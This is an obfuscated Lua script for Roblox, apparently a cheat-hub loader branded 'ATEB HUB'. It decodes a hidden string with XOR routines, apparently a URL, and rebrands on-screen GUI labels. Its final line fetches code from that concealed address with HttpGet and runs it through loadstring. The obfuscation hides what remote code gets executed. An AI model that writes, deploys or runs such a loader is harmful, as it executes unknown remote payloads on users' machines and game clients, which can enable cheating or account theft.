
--[[ STAGE 2: VISUAL CORE ]]
local w2Og8CowPcplUYCVk5SZsFBE = bit32 and bit32.bxor
if not w2Og8CowPcplUYCVk5SZsFBE then
    w2Og8CowPcplUYCVk5SZsFBE = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function OUhtBc0MTZHVk_p5u7(data, a, b, m, s, r)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local step = (b + i * s) % 256
        if m == 0 then
            v = (v - step) % 256
            v = w2Og8CowPcplUYCVk5SZsFBE(v, a)
        else
            v = w2Og8CowPcplUYCVk5SZsFBE(v, a)
            v = (v - step) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local QUPhiA2osS7J41BSESMB4x = {
  {{198, 193, 204, 195, 207, 211, 213}, 114, 164, 0, 3, true, 7},
  {{119, 138, 148, 174, 71, 84, 165}, 51, 50, 0, 4, false, 20},
  {{63, 61, 52, 205, 201, 198}, 69, 9, 1, 3, true, 15},
  {{138, 125, 133, 194, 161, 157, 176}, 78, 74, 0, 6, true, 3},
  {{121, 113, 104, 120}, 232, 29, 1, 5, true, 18},
  {{195, 221}, 96, 188, 0, 6, true, 22},
  {{199, 135, 200, 218, 214, 174}, 141, 208, 1, 6, false, 6},
  {{165, 253, 143, 188, 137, 157, 72}, 78, 121, 1, 6, true, 21},
  {{48, 108, 102, 128, 126}, 149, 113, 0, 5, true, 8},
  {{96, 3, 51, 51, 46}, 210, 116, 0, 1, false, 14},
  {{55, 67, 108}, 76, 250, 0, 5, false, 11},
  {{0, 3, 18}, 102, 238, 0, 7, false, 12},
  {{238, 231, 245, 255, 238, 135, 248}, 67, 55, 1, 4, true, 4},
  {{48, 48, 51, 45, 66, 63}, 24, 177, 0, 4, false, 5},
  {{28, 21, 7, 11}, 179, 66, 1, 1, true, 9},
  {{248, 54, 50, 52, 70, 61, 65}, 159, 51, 0, 5, false, 17},
  {{177, 196, 203, 206}, 224, 34, 0, 7, false, 1},
  {{110, 168, 84, 72, 99, 116, 87}, 70, 181, 1, 5, false, 13},
  {{217, 212, 194, 201, 168, 161}, 108, 70, 1, 3, false, 19},
  {{75, 78, 65, 76, 88, 175, 84}, 47, 240, 1, 4, true, 10},
  {{107, 139, 174, 170}, 214, 219, 0, 7, false, 16},
  {{65, 153, 131, 128}, 238, 59, 1, 1, false, 2}
}
local AvwTovw5G8OHn6s = {}
for UzSbYZwYzGftJKunYEN = 1, #QUPhiA2osS7J41BSESMB4x do
    local bLXIfBfpy78vX7blQdNISupR = QUPhiA2osS7J41BSESMB4x[UzSbYZwYzGftJKunYEN]
    AvwTovw5G8OHn6s[bLXIfBfpy78vX7blQdNISupR[7]] = OUhtBc0MTZHVk_p5u7(bLXIfBfpy78vX7blQdNISupR[1], bLXIfBfpy78vX7blQdNISupR[2], bLXIfBfpy78vX7blQdNISupR[3], bLXIfBfpy78vX7blQdNISupR[4], bLXIfBfpy78vX7blQdNISupR[5], bLXIfBfpy78vX7blQdNISupR[6])
end
local o7vcUMW4cDXa5Oe4Vgaeo = table.concat(AvwTovw5G8OHn6s)
local HubName = "ATEB HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(o7vcUMW4cDXa5Oe4Vgaeo))()
